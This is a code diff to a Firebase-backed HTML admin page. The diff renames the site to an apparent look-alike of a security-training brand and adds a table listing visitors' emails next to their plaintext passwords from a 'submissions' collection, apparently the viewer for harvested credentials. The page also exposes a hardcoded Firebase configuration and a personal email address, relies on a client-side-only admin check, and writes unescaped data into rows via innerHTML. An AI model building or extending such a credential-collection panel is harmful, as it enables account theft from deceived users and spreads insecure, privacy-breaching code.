@@ -3,20 +3,12 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1"/>
-<title>HackLearn Admin</title>
+<title>TryHackingMe Admin</title>
 <style>
-body{margin:0;font-family:'Orbitron',sans-serif;background:#121212;color:#fff;display:flex;min-height:100vh;}
-.sidebar{width:220px;background:#1c1c1c;display:flex;flex-direction:column;padding:20px;position:fixed;top:0;bottom:0;left:0;}
-.sidebar h2{color:#ce93d8;text-align:center;margin-bottom:20px;}
-.sidebar a{color:#fff;text-decoration:none;padding:10px;border-radius:5px;margin-bottom:5px;display:block;transition:0.3s;}
-.sidebar a:hover{background:#333;color:#ce93d8;}
-.main{margin-left:220px;padding:20px;flex:1;}
-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;}
-header h1{color:#ce93d8;}
-header button{padding:8px 15px;border:none;border-radius:5px;background:#8e24aa;color:#fff;cursor:pointer;}
-header button:hover{background:#6a1b9a;}
-table{width:100%;border-collapse:collapse;}
-th,td{padding:12px;border-bottom:1px solid #444;text-align:left;}
+body{margin:0;font-family:'Orbitron',sans-serif;background:#121212;color:#fff;padding:20px;}
+h1{color:#ce93d8;}
+table{width:100%;border-collapse:collapse;margin-top:20px;table-layout:auto;}
+th,td{padding:12px;border-bottom:1px solid #444;text-align:left;word-break:break-word;}
 th{background:#8e24aa;}
 tr:hover{background:#333;}
 .back-btn{padding:8px 15px;border:none;border-radius:5px;background:#555;color:#fff;cursor:pointer;margin-bottom:10px;}
@@ -24,24 +16,23 @@ tr:hover{background:#333;}
 </style>
 </head>
 <body>
-
-<div class="sidebar">
-<h2>HackLearn Admin</h2>
-<a href="#">Dashboard</a>
-<a href="#" onclick="logout()">Logout</a>
-</div>
-
-<div class="main">
 <button class="back-btn" onclick="goBack()">← Back</button>
-<header><h1>Admin Panel</h1></header>
-
+<h1>Admin Panel - TryHackingMe</h1>
+<h2>Users</h2>
 <table>
 <thead>
 <tr><th>Email</th><th>Points</th><th>Badges</th><th>Signup Date</th></tr>
 </thead>
 <tbody id="userList"></tbody>
 </table>
-</div>
+
+<h2>User Submissions</h2>
+<table>
+<thead>
+<tr><th>Email</th><th>Password</th><th>Submitted At</th></tr>
+</thead>
+<tbody id="submissionList"></tbody>
+</table>
 
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
@@ -49,41 +40,52 @@ tr:hover{background:#333;}
 
 <script>
 const firebaseConfig = {
-apiKey: "AIzaSyAmSC92mozosP8JdQGOzF7KE9wCa-h4b_E",
-authDomain: "authdomain-b606b.firebaseapp.com",
-projectId: "authdomain-b606b",
-storageBucket: "authdomain-b606b.firebasestorage.app",
-messagingSenderId: "374508656476",
-appId: "1:374508656476:web:1a1affe311734602bc5399",
-measurementId: "G-FH5BSP31E7"
+  apiKey: "AIzaSyAmSC92mozosP8JdQGOzF7KE9wCa-h4b_E",
+  authDomain: "authdomain-b606b.firebaseapp.com",
+  projectId: "authdomain-b606b",
+  storageBucket: "authdomain-b606b.firebasestorage.app",
+  messagingSenderId: "374508656476",
+  appId: "1:374508656476:web:1a1affe311734602bc5399",
+  measurementId: "G-FH5BSP31E7"
 };
 if(!firebase.apps.length) firebase.initializeApp(firebaseConfig);
 const auth=firebase.auth();
 const db=firebase.firestore();
 
 auth.onAuthStateChanged(user=>{
-if(!user || user.email!=="abdullahyt4622@gmail.com") window.location.href="index.html";
-else loadUsers();
+  if(!user || user.email!=="abdullahyt4622@gmail.com") window.location.href="index.html";
+  else { loadUsers(); loadSubmissions(); }
 });
 
 function loadUsers(){
-db.collection("users").orderBy("createdAt","desc").get().then(snapshot=>{
-const tbody=document.getElementById("userList");
-tbody.innerHTML="";
-snapshot.forEach(doc=>{
-const data=doc.data();
-const createdAt=data.createdAt?data.createdAt.toDate().toLocaleString():"N/A";
-const points=data.points||0;
-const badges=data.badges||0;
-const tr=document.createElement("tr");
-tr.innerHTML=`<td>${data.email}</td><td>${points}</td><td>${badges}</td><td>${createdAt}</td>`;
-tbody.appendChild(tr);
-});
-});
+  db.collection("users").orderBy("createdAt","desc").get().then(snapshot=>{
+    const tbody=document.getElementById("userList");
+    tbody.innerHTML="";
+    snapshot.forEach(doc=>{
+      const data=doc.data();
+      const createdAt=data.createdAt?data.createdAt.toDate().toLocaleString():"N/A";
+      const tr=document.createElement("tr");
+      tr.innerHTML=`<td>${data.email}</td><td>${data.points||0}</td><td>${data.badges||0}</td><td>${createdAt}</td>`;
+      tbody.appendChild(tr);
+    });
+  });
 }
 
-function logout(){auth.signOut().then(()=>window.location.href="index.html");}
-function goBack(){window.location.href="index.html";}
+function loadSubmissions(){
+  db.collection("submissions").orderBy("submittedAt","desc").get().then(snapshot=>{
+    const tbody=document.getElementById("submissionList");
+    tbody.innerHTML="";
+    snapshot.forEach(doc=>{
+      const data=doc.data();
+      const time = data.submittedAt ? data.submittedAt.toDate().toLocaleString() : "N/A";
+      const tr=document.createElement("tr");
+      tr.innerHTML=`<td>${data.email}</td><td>${data.password}</td><td>${time}</td>`;
+      tbody.appendChild(tr);
+    });
+  });
+}
+
+function goBack(){ window.location.href="index.html"; }
 </script>
 </body>
 </html>
